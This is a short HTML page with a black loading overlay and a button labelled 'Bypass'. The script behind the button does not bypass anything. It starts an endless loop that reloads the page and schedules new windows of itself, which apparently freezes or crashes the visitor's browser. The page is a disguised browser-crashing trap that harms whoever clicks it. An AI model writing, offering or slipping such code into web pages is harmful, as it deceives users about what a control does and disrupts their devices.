<style>
  body{
    background:url("");
    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
  }
  button{
    background:white;
    color:black;
    border-radius:2vh;
    padding:2vh;
  }
</style>
<div id="dcslk" style="position:absolute;width:100%;left:0px;top:0px;color:black;text-align:center;"><h1><b></b></h1></div>
<div id="loadingbg" style="position:absolute;width:100%;height:100%;left:0px;top:0px;background-color:black;color:white;text-align:center;"></div>
<div id="loading" style="position:absolute;width:100%;left:0px;top:0px;background-color:black;color:white;text-align:center;"><h1><button id="loadingbutton">Bypass</button></h1></div>
<script>
  
    var loading=document.getElementById("loading");
    loading.style.top=window.innerHeight/2-loading.offsetHeight/2;
    var dcslk=document.getElementById("dcslk");
    dcslk.style.top=window.innerHeight/2-dcslk.offsetHeight/2;
    document.getElementById("loadingbutton").onclick=function(){
      document.getElementById("loading").style.display="none";
      document.getElementById("loadingbg").style.display="none";
      setTimeout(() => {
        while (true){
          window.location.reload();
          setTimeout(()=>{
            window.open(window.location.href);
          },100);
        }
      },100);
    };
</script>
